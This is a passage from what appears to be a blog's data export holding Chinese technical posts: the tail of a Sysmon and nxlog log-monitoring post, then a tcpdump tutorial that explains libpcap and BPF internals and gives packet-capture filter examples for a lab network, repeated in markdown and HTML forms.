title=\"背景\"></a>背景</h5><p>Windows操作系统因本身的安全特点经常成为内网安全渗透的首选目标，如果终端上没有安装EDR产品，基于Windows本身的日志很难监控到入侵行为。</p>\n<p>因此需使用Sysmon及其他日志分析工具相结合来对系统或整个网络环境进行监控和分析。</p>\n<h5 id=\"实战\"><a href=\"#实战\" class=\"headerlink\" title=\"实战\"></a>实战</h5><p><a href=\"https://nxlog.co/\">nxlog</a></p>\n<p>Nxlog主要作用是进行日志转换并发送至syslog服务器中的一款工具。</p>\n<p><img src=\"/images/Sysmon/image-20201020085647637.png\" alt=\"image-20201020085647637\"></p>\n<p>配置安装路径</p>\n<p><img src=\"/images/Sysmon/image-20201020085722321.png\" alt=\"image-20201020085722321\"></p>\n<p><img src=\"/images/Sysmon/image-20201020085743662.png\" alt=\"image-20201020085743662\"></p>\n<p><img src=\"/images/Sysmon/image-20201020085801552.png\" alt=\"image-20201020085801552\"></p>\n<p><img src=\"/images/Sysmon/image-20201020085823438.png\" alt=\"image-20201020085823438\"></p>\n<p>受限于Splunk与国内出口协议规定，目前无法下载。</p>\n<p>后期再补上吧！！</p>\n<h4 id=\"Referer\"><a href=\"#Referer\" class=\"headerlink\" title=\"Referer\"></a>Referer</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;cloud.tencent.com&#x2F;developer&#x2F;article&#x2F;1041591</span><br><span class=\"line\">https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;156704</span><br><span class=\"line\">Sysmon DNS查询</span><br><span class=\"line\">https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;180418</span><br><span class=\"line\">报错解决：</span><br><span class=\"line\">https:&#x2F;&#x2F;superuser.com&#x2F;questions&#x2F;1482486&#x2F;installation-error-of-sysmon-on-windows-7-vm-sysmondrv-driver-and-startservice</span><br><span class=\"line\">辅助工具：</span><br><span class=\"line\">https:&#x2F;&#x2F;www.yuque.com&#x2F;p1ut0&#x2F;xer98r&#x2F;ugrtrf</span><br><span class=\"line\">Sysmon官方文档</span><br><span class=\"line\">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;zh-cn&#x2F;sysinternals&#x2F;downloads&#x2F;sysmon</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"实战参考\"><a href=\"#实战参考\" class=\"headerlink\" title=\"实战参考\"></a>实战参考</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># Sysmon实战分析Word恶意文件</span><br><span class=\"line\">https:&#x2F;&#x2F;www.syspanda.com&#x2F;index.php&#x2F;2017&#x2F;10&#x2F;10&#x2F;threat-hunting-sysmon-word-document-macro&#x2F;</span><br></pre></td></tr></table></figure>\n\n"},{"title":"Tcpdump","date":"2020-07-16T14:11:39.000Z","_content":"\ntcpdump - dump traffic on a network\n\n根据使用者的定义对网络上的数据包进行截获的包分析工具。 tcpdump可以将网络中传送的数据包的“头”完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助你去掉无用的信息。\n\ntcpdump的报文获取功能是通过libpcap库实现。tcpdump需要root权限才可执行，不然攻击者有普通账户权限就能获取很多信息啊！\n\n```shell\n# 获取版本信息时会显示libpcap对应版本信息\n# tcpdump --version\ntcpdump version 4.9.2\nlibpcap version 1.7.4\nOpenSSL 1.0.2g  1 Mar 2016\n```\n\n#### 原理\n\nlinux下的抓包是通过注册一种虚拟的`底层网络协议`来完成对网络报文(准确的说是网络设备)消息的处理权。当网卡接收到一个网络报文之后，它会遍历系统中所有已经注册的网络协议，例如以太网协议、x25协议处理模块来尝试进行报文的解析处理，这一点和一些文件系统的挂载相似，就是让系统中所有的已经注册的文件系统来进行尝试挂载，如果哪一个认为自己可以处理，那么就完成挂载。\n\n当抓包模块把自己伪装成一个网络协议的时候，系统在收到报文的时候就会给这个伪协议一次机会，让它来对网卡收到的报文进行一次处理，此时该模块就会趁机对报文进行窥探，也就是把这个报文完完整整的复制一份，假装是自己接收到的报文，汇报给抓包模块。\n\n#### 如何实现\n\n包传递流程：网卡-->内存-->内核态-->用户程序；tcpdump程序运行在用户态，那如何实现从内核态的抓包？\n\n![793dd841e89e5eb113c041860dfeea234153cfa4](/images/tcpdump/793dd841e89e5eb113c041860dfeea234153cfa4.png)\n\n此时通过`libpcap库`来实现的，tcpdump调用libpcap的api函数，由libpcap进入到内核态到链路层来抓包,如下图：\n\nBPF是过滤器，可以根据用户设置用于数据包过滤减少应用程序的数据包的包数和字节数从而提高性能。\n\nBufferQ是缓存供应用程序读取的数据包；可以说tcpdump底层原理其实就是libpcap的实现原理。\n\n![bc8a1dd22a5130474a0fa6945089fa2a4ccda680](/images/tcpdump/bc8a1dd22a5130474a0fa6945089fa2a4ccda680.png)\n\n而libpcap在linux系统链路层中抓包是通过PF_PACKET套接字来实现的(不同的系统其实现机制是由差异的)，该方法在创建的时候，可以指定第二参数为SOCK_DGRAM或者SOCK_RAW，影响是否扣除链路层的首部。\n\nlibpcap在内核收发包的接口处将skb_clone()拿走的包。\n\n#### libpcap\n\n最早的编译系统和过滤引擎是在tcpdump项目中的，后来为了编译其他抓包的应用，将其独立出来。现在libpcap提供独立于平台的库和API，来满足执行网络嗅探。\n\ntcpdump.c正式使用libpcap里的函数完成两个最关键的动作：获取捕获报文的接口，和捕获报文并将报文交给callback。\n\nlibpcap支持“伯克利包过滤（BPF）”语法。BPF能够通过比较第2、3、4层协议中各个数据字段值的方法对流量进行过滤。Libpcap的使用逻辑如下图:\n\n![9fc92b7b41bb8d51fcb471f76ce6c3be3f564e2a](/images/tcpdump/9fc92b7b41bb8d51fcb471f76ce6c3be3f564e2a.png)\n\n##### libpcap函数\n\n函数分类：[tcpdmp_pcap官方](https://yq.aliyun.com/go/articleRenderRedirect?spm=a2c4e.11153940.0.0.4532acc0MF0CgG&url=http%3A%2F%2Fwww.tcpdump.org%2Fmanpages%2Fpcap.3pcap.html)\n\n1、读包打开句柄\n\n2、抓包选择链路层\n\n3、抓包函数\n\n4、过滤器\n\n5、选定抓包方向（进还是出）\n\n6、抓统计信息\n\n7、将包写入文件打开句柄\n\n8、写包\n\n9、注入包\n\n10、报告错误\n\n11、获取库版本信息\n\n##### 常见函数\n\n- pcap_lookupdev      如果分组捕获设备未曾指定(-i命令行选项)，该函数选择一个设备。\n- pcap_open_offine    打开一个保存的文件。\n- pcap_setfilter            设置过滤器\n- pcap_open_live         打开选择的设备。\n- pcap_next                   接收一个包\n- pcap_dump                将包写入到pcap_dump_t结构体\n- pcap_loopupnet        返回分组捕获设备的网络地址和子网掩码，然后在调用pcap_compile时必须指定这个子网掩码。\n- pcap_compile             把cmd字符数组中构造的过滤器字符串编译成一个过滤器程序，存放在fcode中。\n- pcap_setfilter              把编译出来的过滤器程序装载到分组捕获设备，同时引发用该过滤器选取的分组的捕获。\n- pcap_datalink              返回分组捕获设备的数据链路类型。\n\n#### 协议注册\n\n对于以上介绍的协议，也只有在需要的时候才会注册，因为它毕竟增加了系统报文的处理速度并且会消耗大量的系统skb。当抓包开始的时候，它会创建一个对应的网络套接口，这种套接口的类型就是`af_packet`类型。相关实现参考C源码：[af_packet.c](http://lxr.linux.no/linux+v3.4/net/packet/af_packet.c)。\n\n````c\nstatic int packet_create(struct socket *sock, int protocol)\n{\n    struct sock *sk;\n    struct packet_opt *po;\n    int err;\n    if (!capable(CAP_NET_RAW))\n        return -EPERM;\n    if (sock->type != SOCK_DGRAM && sock->type != SOCK_RAW\n#ifdef CONFIG_SOCK_PACKET\n     && sock->type != SOCK_PACKET\n#endif\n     )\n        return -ESOCKTNOSUPPORT;\n    sock->state = SS_UNCONNECTED;\n    err = -ENOBUFS;\n    sk = sk_alloc(PF_PACKET, GFP_KERNEL, 1, NULL);\n    if (sk == NULL)\n        goto out;\n    sock->ops = &packet_ops;\n#ifdef CONFIG_SOCK_PACKET\n    if (sock->type == SOCK_PACKET)\n        sock->ops = &packet_ops_spkt;\n#endif\n    sock_init_data(sock,sk);\n    sk_set_owner(sk, THIS_MODULE);\n\n    po = sk->sk_protinfo = kmalloc(sizeof(*po), GFP_KERNEL);\n    if (!po)\n        goto out_free;\n    memset(po, 0, sizeof(*po));\n    sk->sk_family = PF_PACKET;\n    po->num = protocol;\n\n    sk->sk_destruct = packet_sock_destruct;\n    atomic_inc(&packet_socks_nr);\n\n    /*\n     *    Attach a protocol block\n     */\n\n    spin_lock_init(&po->bind_lock);\n    po->prot_hook.func = packet_rcv;       ----- 这个地方挂接处理函数，注册为packet_rcv。\n#ifdef CONFIG_SOCK_PACKET\n    if (sock->type == SOCK_PACKET)\n        po->prot_hook.func = packet_rcv_spkt;\n#endif\n    po->prot_hook.af_packet_priv = sk;\n\n    if (protocol) {\n        po->prot_hook.type = protocol;\n        dev_add_pack(&po->prot_hook);      ----- dev_add_pack将协议加入到ptype_all链表中，具体参考下面函数代码\n        sock_hold(sk);\n        po->running = 1;\n    }\n    write_lock_bh(&packet_sklist_lock);\n    sk_add_node(sk, &packet_sklist);\n    write_unlock_bh(&packet_sklist_lock);\n    return(0);\n\nout_free:\n    sk_free(sk);\nout:\n    return err;\n}\n````\n\n#### Options\n\n```shell\n# tcpdump -n -vvvv -i ens33 host 172.16.144.141 and port 80 -w web.pcap\n\n-n：不转换主机名、端口号（开启后看到的是IP地址，而不是主机名，实际使用中我们一般都比较关注服务器IP地址）\n-v：显示详细信息，v越多信息越多\n-i：指定网络接口，也就网卡的名字，常用的有eth0,eth1等，如果要监听所有网卡就是用-i any。\n-w：抓取的包写入到文件，方便后续分析。实际中经常使用tcpdump抓包保存，然后使用Wireshark分析\n-r：抓到的包也可以tcpdump打开再分析，tcpdump -n -vvvv -r data.cap\n-c：指定抓取的包的数目\n-s：指定抓取的数据的长度\n```\n\n![image-20200716175428104](/images/tcpdump/image-20200716175428104.png)\n\nWireshark打开\n\n![image-20200716184023410](/images/tcpdump/image-20200716184023410.png)\n\n#### 常见命令\n\n这部分简单演示了tcpdump的使用，如需常见语法可直接查看`基本语法`\n\n```shell\n# \"GET\"的十六进制是 47455420\n# 监听对本地进行GET请求数据包\ntcpdump -i ens33 'tcp[(tcp[12]>>2):4] = 0x47455420'\n```\n\n![image-20200716185547770](/images/tcpdump/image-20200716185547770.png)\n\n```shell\n# \"SSH-\"的十六进制是 0x5353482D\ntcpdump -i ens33 'tcp[(tcp[12]>>2):4] = 0x5353482D'\n```\n\n![image-20200716184806562](/images/tcpdump/image-20200716184806562.png)\n\n```shell\n# 截获DNS请求数据\ntcpdump -i ens33 udp dst port 53\n```\n\n```shell\n# 截获大于600字节\ntcpdump -i ens33 'ip[2:2] > 600'\n```\n\n#### 过滤器\n\n- 过滤器的关键词有：host、port、 net、src、 dst、icmp、tcp、udp、http\n\n- 逻辑关键词：and、or、not\n\n- 包头过滤\n\n  ````shell\n  tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack != 0\n  ````\n\n#### 数据分析\n\n```shell\ntcpdump: listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes\n21:45:10.830435 IP (tos 0x0, ttl 64, id 63824, offset 0, flags [DF], proto TCP (6), length 60)\n    18:54:59.000951 IP 172.16.144.1.64074 > 172.16.144.141.http: Flags [P.], seq 352511301:352511594, ack 1460171085, win 4117, options [nop,nop,TS val 872905073 ecr 10965627], length 293: HTTP: GET /robots.txt HTTP/1.1\n```\n\n`172.16.144.1.64074 > 172.16.144.141.http` 这里源地址(`172.16.144.1.64074`)到目的地址(`172.16.144.141.http`)\n\n`Flags [S]`是包的标志，`[S]`表示是`SYC`:\n\n```shell\n[S] – SYN (开始连接)\n[.] – 没有标记 (一般是确认)\n[P] – PSH (数据推送)\n[F] – FIN (结束连接)\n[R] – RST (重启连接)\n```\n\n为了提高网络效率，一个包也可以包含标志的组合，比如`[S.]`，`[FP.]`\n\n- `seq`：同步序列编号，Synchronize Sequence Numbers；\n- `ack`：确认编号，Acknowledgement Number；\n- `win`：滑动窗口大小\n- `length`：承载的数据(payload)长度length，如果没有数据则为0\n\n![1760830-e18fbb8480375fcd](/images/tcpdump/1760830-e18fbb8480375fcd.jpeg)\n\n#### 基本语法\n\n##### 1.过滤主机\n\n抓取所有经过ens33，目的或源地址是172.16.144.141的网络数据\n\n```shell\ntcpdump -i ens33 host 172.16.144.141\n```\n\n指定源地址\n\n```shell\ntcpdump -i ens33 src host 172.16.144.141\n```\n\n指定目的地址\n\n```shell\ntcpdump -i ens33 dst host 172.16.144.1\n```\n\n##### 2.过滤端口\n\n抓取所有经过ens33，目的或源端口是80的网络数据\n\n```shell\ntcpdump -i ens33 port 80\n```\n\n指定源端口\n\n```shell\ntcpdump -i ens33 src port 80\n```\n\n指定目的端口\n\n```shell\ntcpdump -i ens33 dst port 80\n```\n\n##### 3.网络过滤\n\n```shell\ntcpdump -i ens33 net 172.16\ntcpdump -i ens33 src net 172.16\ntcpdump -i ens33 dst net 172.16\n```\n\n##### 4.协议过滤\n\n```shell\ntcpdump -i ens33 arp\ntcpdump -i ens33 ip\ntcpdump -i eth1 tcp\ntcpdump -i eth1 udp\ntcpdump -i eth1 icmp\n```\n\n##### 5.表达式\n\n```shell\n非 : ! or \"not\" (去掉双引号)  \n且 : && or \"and\"  \n或 : || or \"or\"\n```\n\n抓取所有经过ens33，目的地址是172.16.144.141或172.16.141.1端口是80的TCP数据\n\n```shell\ntcpdump -i ens33 '((tcp) and (port 80) and ((dst host 172.16.144.141) or (dst host 172.16.141.1)))'\n```\n\n抓取所有经过ens33，目标MAC地址是00:0c:29:aa:b2:93的ICMP数据\n\n```shell\ntcpdump -i ens33 '((icmp) and ((ether dst host 00:0c:29:aa:b2:93)))'\n```\n\n抓取所有经过ens33，目的ip是172.16，但目的主机不是172.16.144.1的TCP数据\n\n```shell\ntcpdump -i ens33 '((tcp) and ((dst net 172.16) and (not dst host 172.16.144.141)))'\n```\n\n##### 6.运维\n\n```shell\ntcpdump -s 0 -w filename\n-s 0是抓取完整数据包，否则默认只抓68字节\n```\n\n`-c`参数对于运维人员来说也比较常用，因为流量比较大的服务器，靠人工CTRL+C还是抓的太多，甚至导致服务器宕机，于是可以用`-c`参数指定抓多少个包。\n\n```shell\ntcpdump -nn -i ens33 'tcp[tcpflags] = tcp-syn' -c 10000\n```\n\n##### 7.高级\n\n高级包头过滤可参考[这里](https://linuxwiki.github.io/NetTools/tcpdump.html)\n\n#### 常见问题\n\n- 如果数据包中出现很多的`cksum 0xxxx incorrect`错误：是因为操作系统为了提高网络效率不再计算校验码，而是交给网卡计算\n\n#### 参考\n\n```\nLinux抓包原理:\nhttps://www.iyunv.com/thread-149869-1-1.html\ntcpdump源码分析:\nhttps://yq.aliyun.com/articles/573120\ntcpdump语法:\nhttps://linuxwiki.github.io/NetTools/tcpdump.html\n```\n\n","source":"_posts/Tcpdump.md","raw":"---\ntitle: Tcpdump\ndate: 2020-07-16 22:11:39\ntags:\n - Tcpdump\n---\n\ntcpdump - dump traffic on a network\n\n根据使用者的定义对网络上的数据包进行截获的包分析工具。 tcpdump可以将网络中传送的数据包的“头”完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助你去掉无用的信息。\n\ntcpdump的报文获取功能是通过libpcap库实现。tcpdump需要root权限才可执行，不然攻击者有普通账户权限就能获取很多信息啊！\n\n```shell\n# 获取版本信息时会显示libpcap对应版本信息\n# tcpdump --version\ntcpdump version 4.9.2\nlibpcap version 1.7.4\nOpenSSL 1.0.2g  1 Mar 2016\n```\n\n#### 原理\n\nlinux下的抓包是通过注册一种虚拟的`底层网络协议`来完成对网络报文(准确的说是网络设备)消息的处理权。当网卡接收到一个网络报文之后，它会遍历系统中所有已经注册的网络协议，例如以太网协议、x25协议处理模块来尝试进行报文的解析处理，这一点和一些文件系统的挂载相似，就是让系统中所有的已经注册的文件系统来进行尝试挂载，如果哪一个认为自己可以处理，那么就完成挂载。\n\n当抓包模块把自己伪装成一个网络协议的时候，系统在收到报文的时候就会给这个伪协议一次机会，让它来对网卡收到的报文进行一次处理，此时该模块就会趁机对报文进行窥探，也就是把这个报文完完整整的复制一份，假装是自己接收到的报文，汇报给抓包模块。\n\n#### 如何实现\n\n包传递流程：网卡-->内存-->内核态-->用户程序；tcpdump程序运行在用户态，那如何实现从内核态的抓包？\n\n![793dd841e89e5eb113c041860dfeea234153cfa4](/images/tcpdump/793dd841e89e5eb113c041860dfeea234153cfa4.png)\n\n此时通过`libpcap库`来实现的，tcpdump调用libpcap的api函数，由libpcap进入到内核态到链路层来抓包,如下图：\n\nBPF是过滤器，可以根据用户设置用于数据包过滤减少应用程序的数据包的包数和字节数从而提高性能。\n\nBufferQ是缓存供应用程序读取的数据包；可以说tcpdump底层原理其实就是libpcap的实现原理。\n\n![bc8a1dd22a5130474a0fa6945089fa2a4ccda680](/images/tcpdump/bc8a1dd22a5130474a0fa6945089fa2a4ccda680.png)\n\n而libpcap在linux系统链路层中抓包是通过PF_PACKET套接字来实现的(不同的系统其实现机制是由差异的)，该方法在创建的时候，可以指定第二参数为SOCK_DGRAM或者SOCK_RAW，影响是否扣除链路层的首部。\n\nlibpcap在内核收发包的接口处将skb_clone()拿走的包。\n\n#### libpcap\n\n最早的编译系统和过滤引擎是在tcpdump项目中的，后来为了编译其他抓包的应用，将其独立出来。现在libpcap提供独立于平台的库和API，来满足执行网络嗅探。\n\ntcpdump.c正式使用libpcap里的函数完成两个最关键的动作：获取捕获报文的接口，和捕获报文并将报文交给callback。\n\nlibpcap支持“伯克利包过滤（BPF）”语法。BPF能够通过比较第2、3、4层协议中各个数据字段值的方法对流量进行过滤。Libpcap的使用逻辑如下图:\n\n![9fc92b7b41bb8d51fcb471f76ce6c3be3f564e2a](/images/tcpdump/9fc92b7b41bb8d51fcb471f76ce6c3be3f564e2a.png)\n\n##### libpcap函数\n\n函数分类：[tcpdmp_pcap官方](https://yq.aliyun.com/go/articleRenderRedirect?spm=a2c4e.11153940.0.0.4532acc0MF0CgG&url=http%3A%2F%2Fwww.tcpdump.org%2Fmanpages%2Fpcap.3pcap.html)\n\n1、读包打开句柄\n\n2、抓包选择链路层\n\n3、抓包函数\n\n4、过滤器\n\n5、选定抓包方向（进还是出）\n\n6、抓统计信息\n\n7、将包写入文件打开句柄\n\n8、写包\n\n9、注入包\n\n10、报告错误\n\n11、获取库版本信息\n\n##### 常见函数\n\n- pcap_lookupdev      如果分组捕获设备未曾指定(-i命令行选项)，该函数选择一个设备。\n- pcap_open_offine    打开一个保存的文件。\n- pcap_setfilter            设置过滤器\n- pcap_open_live         打开选择的设备。\n- pcap_next                   接收一个包\n- pcap_dump                将包写入到pcap_dump_t结构体\n- pcap_loopupnet        返回分组捕获设备的网络地址和子网掩码，然后在调用pcap_compile时必须指定这个子网掩码。\n- pcap_compile             把cmd字符数组中构造的过滤器字符串编译成一个过滤器程序，存放在fcode中。\n- pcap_setfilter              把编译出来的过滤器程序装载到分组捕获设备，同时引发用该过滤器选取的分组的捕获。\n- pcap_datalink              返回分组捕获设备的数据链路类型。\n\n#### 协议注册\n\n对于以上介绍的协议，也只有在需要的时候才会注册，因为它毕竟增加了系统报文的处理速度并且会消耗大量的系统skb。当抓包开始的时候，它会创建一个对应的网络套接口，这种套接口的类型就是`af_packet`类型。相关实现参考C源码：[af_packet.c](http://lxr.linux.no/linux+v3.4/net/packet/af_packet.c)。\n\n````c\nstatic int packet_create(struct socket *sock, int protocol)\n{\n    struct sock *sk;\n    struct packet_opt *po;\n    int err;\n    if (!capable(CAP_NET_RAW))\n        return -EPERM;\n    if (sock->type != SOCK_DGRAM && sock->type != SOCK_RAW\n#ifdef CONFIG_SOCK_PACKET\n     && sock->type != SOCK_PACKET\n#endif\n     )\n        return -ESOCKTNOSUPPORT;\n    sock->state = SS_UNCONNECTED;\n    err = -ENOBUFS;\n    sk = sk_alloc(PF_PACKET, GFP_KERNEL, 1, NULL);\n    if (sk == NULL)\n        goto out;\n    sock->ops = &packet_ops;\n#ifdef CONFIG_SOCK_PACKET\n    if (sock->type == SOCK_PACKET)\n        sock->ops = &packet_ops_spkt;\n#endif\n    sock_init_data(sock,sk);\n    sk_set_owner(sk, THIS_MODULE);\n\n    po = sk->sk_protinfo = kmalloc(sizeof(*po), GFP_KERNEL);\n    if (!po)\n        goto out_free;\n    memset(po, 0, sizeof(*po));\n    sk->sk_family = PF_PACKET;\n    po->num = protocol;\n\n    sk->sk_destruct = packet_sock_destruct;\n    atomic_inc(&packet_socks_nr);\n\n    /*\n     *    Attach a protocol block\n     */\n\n    spin_lock_init(&po->bind_lock);\n    po->prot_hook.func = packet_rcv;       ----- 这个地方挂接处理函数，注册为packet_rcv。\n#ifdef CONFIG_SOCK_PACKET\n    if (sock->type == SOCK_PACKET)\n        po->prot_hook.func = packet_rcv_spkt;\n#endif\n    po->prot_hook.af_packet_priv = sk;\n\n    if (protocol) {\n        po->prot_hook.type = protocol;\n        dev_add_pack(&po->prot_hook);      ----- dev_add_pack将协议加入到ptype_all链表中，具体参考下面函数代码\n        sock_hold(sk);\n        po->running = 1;\n    }\n    write_lock_bh(&packet_sklist_lock);\n    sk_add_node(sk, &packet_sklist);\n    write_unlock_bh(&packet_sklist_lock);\n    return(0);\n\nout_free:\n    sk_free(sk);\nout:\n    return err;\n}\n````\n\n#### Options\n\n```shell\n# tcpdump -n -vvvv -i ens33 host 172.16.144.141 and port 80 -w web.pcap\n\n-n：不转换主机名、端口号（开启后看到的是IP地址，而不是主机名，实际使用中我们一般都比较关注服务器IP地址）\n-v：显示详细信息，v越多信息越多\n-i：指定网络接口，也就网卡的名字，常用的有eth0,eth1等，如果要监听所有网卡就是用-i any。\n-w：抓取的包写入到文件，方便后续分析。实际中经常使用tcpdump抓包保存，然后使用Wireshark分析\n-r：抓到的包也可以tcpdump打开再分析，tcpdump -n -vvvv -r data.cap\n-c：指定抓取的包的数目\n-s：指定抓取的数据的长度\n```\n\n![image-20200716175428104](/images/tcpdump/image-20200716175428104.png)\n\nWireshark打开\n\n![image-20200716184023410](/images/tcpdump/image-20200716184023410.png)\n\n#### 常见命令\n\n这部分简单演示了tcpdump的使用，如需常见语法可直接查看`基本语法`\n\n```shell\n# \"GET\"的十六进制是 47455420\n# 监听对本地进行GET请求数据包\ntcpdump -i ens33 'tcp[(tcp[12]>>2):4] = 0x47455420'\n```\n\n![image-20200716185547770](/images/tcpdump/image-20200716185547770.png)\n\n```shell\n# \"SSH-\"的十六进制是 0x5353482D\ntcpdump -i ens33 'tcp[(tcp[12]>>2):4] = 0x5353482D'\n```\n\n![image-20200716184806562](/images/tcpdump/image-20200716184806562.png)\n\n```shell\n# 截获DNS请求数据\ntcpdump -i ens33 udp dst port 53\n```\n\n```shell\n# 截获大于600字节\ntcpdump -i ens33 'ip[2:2] > 600'\n```\n\n#### 过滤器\n\n- 过滤器的关键词有：host、port、 net、src、 dst、icmp、tcp、udp、http\n\n- 逻辑关键词：and、or、not\n\n- 包头过滤\n\n  ````shell\n  tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack != 0\n  ````\n\n#### 数据分析\n\n```shell\ntcpdump: listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes\n21:45:10.830435 IP (tos 0x0, ttl 64, id 63824, offset 0, flags [DF], proto TCP (6), length 60)\n    18:54:59.000951 IP 172.16.144.1.64074 > 172.16.144.141.http: Flags [P.], seq 352511301:352511594, ack 1460171085, win 4117, options [nop,nop,TS val 872905073 ecr 10965627], length 293: HTTP: GET /robots.txt HTTP/1.1\n```\n\n`172.16.144.1.64074 > 172.16.144.141.http` 这里源地址(`172.16.144.1.64074`)到目的地址(`172.16.144.141.http`)\n\n`Flags [S]`是包的标志，`[S]`表示是`SYC`:\n\n```shell\n[S] – SYN (开始连接)\n[.] – 没有标记 (一般是确认)\n[P] – PSH (数据推送)\n[F] – FIN (结束连接)\n[R] – RST (重启连接)\n```\n\n为了提高网络效率，一个包也可以包含标志的组合，比如`[S.]`，`[FP.]`\n\n- `seq`：同步序列编号，Synchronize Sequence Numbers；\n- `ack`：确认编号，Acknowledgement Number；\n- `win`：滑动窗口大小\n- `length`：承载的数据(payload)长度length，如果没有数据则为0\n\n![1760830-e18fbb8480375fcd](/images/tcpdump/1760830-e18fbb8480375fcd.jpeg)\n\n#### 基本语法\n\n##### 1.过滤主机\n\n抓取所有经过ens33，目的或源地址是172.16.144.141的网络数据\n\n```shell\ntcpdump -i ens33 host 172.16.144.141\n```\n\n指定源地址\n\n```shell\ntcpdump -i ens33 src host 172.16.144.141\n```\n\n指定目的地址\n\n```shell\ntcpdump -i ens33 dst host 172.16.144.1\n```\n\n##### 2.过滤端口\n\n抓取所有经过ens33，目的或源端口是80的网络数据\n\n```shell\ntcpdump -i ens33 port 80\n```\n\n指定源端口\n\n```shell\ntcpdump -i ens33 src port 80\n```\n\n指定目的端口\n\n```shell\ntcpdump -i ens33 dst port 80\n```\n\n##### 3.网络过滤\n\n```shell\ntcpdump -i ens33 net 172.16\ntcpdump -i ens33 src net 172.16\ntcpdump -i ens33 dst net 172.16\n```\n\n##### 4.协议过滤\n\n```shell\ntcpdump -i ens33 arp\ntcpdump -i ens33 ip\ntcpdump -i eth1 tcp\ntcpdump -i eth1 udp\ntcpdump -i eth1 icmp\n```\n\n##### 5.表达式\n\n```shell\n非 : ! or \"not\" (去掉双引号)  \n且 : && or \"and\"  \n或 : || or \"or\"\n```\n\n抓取所有经过ens33，目的地址是172.16.144.141或172.16.141.1端口是80的TCP数据\n\n```shell\ntcpdump -i ens33 '((tcp) and (port 80) and ((dst host 172.16.144.141) or (dst host 172.16.141.1)))'\n```\n\n抓取所有经过ens33，目标MAC地址是00:0c:29:aa:b2:93的ICMP数据\n\n```shell\ntcpdump -i ens33 '((icmp) and ((ether dst host 00:0c:29:aa:b2:93)))'\n```\n\n抓取所有经过ens33，目的ip是172.16，但目的主机不是172.16.144.1的TCP数据\n\n```shell\ntcpdump -i ens33 '((tcp) and ((dst net 172.16) and (not dst host 172.16.144.141)))'\n```\n\n##### 6.运维\n\n```shell\ntcpdump -s 0 -w filename\n-s 0是抓取完整数据包，否则默认只抓68字节\n```\n\n`-c`参数对于运维人员来说也比较常用，因为流量比较大的服务器，靠人工CTRL+C还是抓的太多，甚至导致服务器宕机，于是可以用`-c`参数指定抓多少个包。\n\n```shell\ntcpdump -nn -i ens33 'tcp[tcpflags] = tcp-syn' -c 10000\n```\n\n##### 7.高级\n\n高级包头过滤可参考[这里](https://linuxwiki.github.io/NetTools/tcpdump.html)\n\n#### 常见问题\n\n- 如果数据包中出现很多的`cksum 0xxxx incorrect`错误：是因为操作系统为了提高网络效率不再计算校验码，而是交给网卡计算\n\n#### 参考\n\n```\nLinux抓包原理:\nhttps://www.iyunv.com/thread-149869-1-1.html\ntcpdump源码分析:\nhttps://yq.aliyun.com/articles/573120\ntcpdump语法:\nhttps://linuxwiki.github.io/NetTools/tcpdump.html\n```\n\n","slug":"Tcpdump","published":1,"updated":"2020-10-23T03:38:55.721Z","_id":"ckglobhdu000jb1hq5kl27se6","comments":1,"layout":"post","photos":[],"link":"","content":"<p>tcpdump - dump traffic on a network</p>\n<p>根据使用者的定义对网络上的数据包进行截获的包分析工具。 tcpdump可以将网络中传送的数据包的“头”完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助你去掉无用的信息。</p>\n<p>tcpdump的报文获取功能是通过libpcap库实现。tcpdump需要root权限才可执行，不然攻击者有普通账户权限就能获取很多信息啊！</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 获取版本信息时会显示libpcap对应版本信息</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> tcpdump --version</span></span><br><span class=\"line\">tcpdump version 4.9.2</span><br><span class=\"line\">libpcap version 1.7.4</span><br><span class=\"line\">OpenSSL 1.0.2g  1 Mar 2016</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h4><p>linux下的抓包是通过注册一种虚拟的<code>底层网络协议</code>来完成对网络报文(准确的说是网络设备)消息的处理权。当网卡接收到一个网络报文之后，它会遍历系统中所有已经注册的网络协议，例如以太网协议、x25协议处理模块来尝试进行报文的解析处理，这一点和一些文件系统的挂载相似，就是让系统中所有的已经注册的文件系统来进行尝试挂载，如果哪一个认为自己可以处理，那么就完成挂载。</p>\n<p>当抓包模块把自己伪装成一个网络协议的时候，系统在收到报文的时候就会给这个伪协议一次机会，让它来对网卡收到的报文进行一次处理，此时该模块就会趁机对报文进行窥探，也就是把这个报文完完整整的复制一份，假装是自己接收到的报文，汇报给抓包模块。</p>\n<h4 id=\"如何实现\"><a href=\"#如何实现\" class=\"headerlink\" title=\"如何实现\"></a>如何实现</h4><p>包传递流程：网卡–&gt;内存–&gt;内核态–&gt;用户程序；tcpdump程序运行在用户态，那如何实现从内核态的抓包？</p>\n<p><img 